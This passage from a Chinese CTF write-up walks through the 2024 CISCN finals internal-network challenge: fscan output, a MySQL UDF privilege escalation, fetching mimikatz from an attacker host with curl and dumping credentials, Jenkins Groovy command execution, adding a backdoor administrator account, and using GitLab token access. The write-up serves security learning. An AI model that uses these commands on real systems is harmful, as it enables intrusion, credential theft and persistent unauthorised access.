src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084318969.png" alt="image-20240721084318969"></p><p>接下来以这个为跳板机，传个fscan扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.8.146/24<span class="token number">192.168</span>.8.146:22 <span class="token function">open</span><span class="token number">192.168</span>.8.38:139 <span class="token function">open</span><span class="token number">192.168</span>.8.16:139 <span class="token function">open</span><span class="token number">192.168</span>.8.26:139 <span class="token function">open</span><span class="token number">192.168</span>.8.9:139 <span class="token function">open</span><span class="token number">192.168</span>.8.12:139 <span class="token function">open</span><span class="token number">192.168</span>.8.26:135 <span class="token function">open</span><span class="token number">192.168</span>.8.38:135 <span class="token function">open</span><span class="token number">192.168</span>.8.16:135 <span class="token function">open</span><span class="token number">192.168</span>.8.12:135 <span class="token function">open</span><span class="token number">192.168</span>.8.9:135 <span class="token function">open</span><span class="token number">192.168</span>.8.9:1433 <span class="token function">open</span><span class="token number">192.168</span>.8.38:445 <span class="token function">open</span><span class="token number">192.168</span>.8.26:445 <span class="token function">open</span><span class="token number">192.168</span>.8.16:445 <span class="token function">open</span><span class="token number">192.168</span>.8.12:445 <span class="token function">open</span><span class="token number">192.168</span>.8.9:445 <span class="token function">open</span><span class="token number">192.168</span>.8.42:80 <span class="token function">open</span><span class="token number">192.168</span>.8.42:22 <span class="token function">open</span><span class="token number">192.168</span>.8.26:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.16:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.146:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.9:8000 <span class="token function">open</span><span class="token number">192.168</span>.8.9:80 <span class="token function">open</span><span class="token number">192.168</span>.8.38:3306 <span class="token function">open</span><span class="token number">192.168</span>.8.12:88 <span class="token function">open</span><span class="token number">192.168</span>.8.42:8060 <span class="token function">open</span><span class="token number">192.168</span>.8.9:8172 <span class="token function">open</span><span class="token number">192.168</span>.8.42:9094 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.9     WORKGROUP<span class="token punctuation">\</span>WIN-IISSERER        <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.26    WORKGROUP<span class="token punctuation">\</span>WIN-PC3788          <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.12    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> DC:VERTEXSOFT<span class="token punctuation">\</span>RODC         <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.38    WORKGROUP<span class="token punctuation">\</span>WIN-OPS88           <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.16    WORKGROUP<span class="token punctuation">\</span>WIN-SERVER03        <span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42:8060  code:404 len:555    title:404 Not Found<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.12   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>RODC   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.12<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.9   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-IISSERER   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.16   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-SERVER03   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.16<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080 code:302 len:0      title:None 跳转url: http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42       code:302 len:99     title:None 跳转url: http://192.168.8.42/users/sign_in<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.26:8080  code:200 len:147    title:第一个 JSP 程序<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9        code:200 len:43679  title:VertexSoft<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle https://192.168.8.9:8172  code:404 len:0      title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42/users/sign_in code:200 len:11166  title:登录 · GitLab<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-spring-actuator-heapdump-file <span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-springboot-env-unauth spring2<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="WIN-OPS88"><a href="#WIN-OPS88" class="headerlink" title="WIN-OPS88"></a>WIN-OPS88</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做chisel代理把WIN-OPS88的数据库端口转发出来（其实可以直接做sockets代理出所有的内网ip，巨魔教的）</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095403405.png" alt="image-20240721095403405"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095424140.png" alt="image-20240721095424140"></p><p>既然有账密，那么直接sql连上去，数据库里没别的东西</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721225527342.png" alt="image-20240721225527342"></p><p>尝试udf提权，注意是win64的payload（这里我看别人直接用mdut工具一把梭了，而我的还在报错）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"%plugin%"</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token number">span> <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">"C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\udf.so"</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> sys_eval <span class="token keyword">RETURNS</span> STRING <span class="token keyword">SONAME</span> <span class="token string">"udf.so"</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"type C:\\Users\\Administrator\\flag\\flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>读到flag（草我怎么写了个so进去，应该是dll的）</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095325681.png" alt="image-20240721095325681"></p><p>接下来尝试丢mimikatz收集信息（实际无用）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"curl  http://192.168.36.88:8080/mimikatz.exe -o mimikatz.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "lsadump::dcsync /user:Administrator" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "creds_all" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 68033 (00000000:000109c1)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-90-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : WIN-OPS88$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-20msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos : * Username : win-ops88$ * Domain   : WORKGROUP * Password : (null)ssp :credman :cloudap :Authentication Id : 0 ; 31473 (00000000:00007af1)Session           : Interactive from 0User Name         : UMFD-0Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-96-0-0msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 68016 (00000000:000109b0)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-90-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-19msv :tspkg :wdigest : * Username : (null) * Domain   : (null) * Password : (null)kerberos : * Username : (null) * Domain   : (null) * Password : (null)ssp :credman :cloudap :Authentication Id : 0 ; 31470 (00000000:00007aee)Session           : Interactive from 1User Name         : UMFD-1Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-96-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 30495 (00000000:0000771f)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 7/21/2024 6:17:46 AMSID               : msv :tspkg :wdigest :kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : WIN-OPS88$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 7/21/2024 6:17:46 AMSID               : S-1-5-18msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos : * Username : win-ops88$ * Domain   : WORKGROUP * Password : (null)ssp :credman :cloudap :mimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # lsadump::dcsync /user:AdministratorERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDNmimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # creds_allERROR mimikatz_doLocal ; "creds_all" command of "standard" module not found !Module :standardFull name :Standard moduleDescription :Basic commands (does not require module name)            exit  -  Quit mimikatz             cls  -  Clear screen (doesn't work with redirections, like PsExec)          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything          coffee  -  Please, make me a coffee!           sleep  -  Sleep an amount of milliseconds             log  -  Log mimikatz input/output to file          base64  -  Switch file input/output base64         version  -  Display some version informations              cd  -  Change or display current directory       localtime  -  Displays system local date and time (OJ command)        hostname  -  Displays system local hostnamemimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>都没啥用</p><p>看别人这里是<code>net user Administrator &lt;password&gt;</code>进行密码修改，然后通过WindowsRDP进行远程桌面登陆</p><hr><h2 id="RODC（Unsolved）"><a href="#RODC（Unsolved）" class="headerlink" title="RODC（Unsolved）"></a>RODC（Unsolved）</h2><p>不懂，好像是smb密码喷洒</p><p>别的师傅的非预期：</p><p>在WIN-OPS88桌面上有一个<code>WPS OFFICE</code>，点开后查看Recent，发现了一个表格，里面有一组账号密码。</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1370778707.png" alt="2024-07-22T06:05:09.png"></p><p>由于文件名带有<code>ROAdmins</code>，很容易想到是RODC相关密码，发现这些密码均能远程登陆RODC Windows的RDP</p><p><br>可惜我没练过渗透，不然应该能想到拿完Windows的shell后要尝试下rdp的</p><hr><h2 id="Jinkens"><a href="#Jinkens" class="headerlink" title="Jinkens"></a>Jinkens</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jenkins服务</p><p>测试出账密admin:admin123可以登录进去</p><p>在Script Console里面打Groovy脚本就行：参考<a href="https://xz.aliyun.com/t/6372">https://xz.aliyun.com/t/6372</a></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105348773.png" alt="image-20240721105348773"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105555762.png" alt="image-20240721105555762"></p><p>那么同样的可以读flag</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">String fileContents <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\Administrator\\flag\\flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105744258.png" alt="image-20240721105744258"></p><p>或者执行命令：</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">println <span class="token interpolation-string"><span class="token string">"whoami"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>远程桌面账密：</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">println <span class="token interpolation-string"><span class="token string">"net user test qwer1234! /add"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token interpolation-string"><span class="token string">"net localgroup administrators test /add"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="Gitlab（TimeOut）"><a href="#Gitlab（TimeOut）" class="headerlink" title="Gitlab（TimeOut）"></a>Gitlab（TimeOut）</h2><p>靠，是原题：<a href="https://xz.aliyun.com/t/13378">https://xz.aliyun.com/t/13378</a></p><p>但是最后十分钟的时候才发现，来不及了没做完，jenkins的服务还慢得要死。。</p><p>依旧是在Jenkins里面，进入对应选项卡，点击change password</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140214428.png" alt="image-20240721140214428"></p><p>ctrl+u找到apitoken</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来用Script console解密</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token function">println</span><span class="token punctuation">(</span>hudson<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Secret<span class="token punctuation">.</span><span class="token function">fromString</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">"&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPlainText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>剩下的来不及了😭</p><br><p>有了apitoken之后就能访问gitlab的所有仓库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> <span class="token parameter variable">--header</span> <span class="token string">"PRIVATE-TOKEN: glpat-bGEgHAJDvwaPP78rsLeS"</span> <span class="token string">"http://192.168.8.42/api/v4/projects"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以获得一个巨大的返回json，通过这个json可以观察到GitLab中所有的储存库信息</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoftBackup"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / VertexSoftBackup"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoftbackup"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/vertexsoftbackup"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:03:43.603Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/vertexsoftbackup.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup/-/blob/main/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-17T05:42:29.243Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token 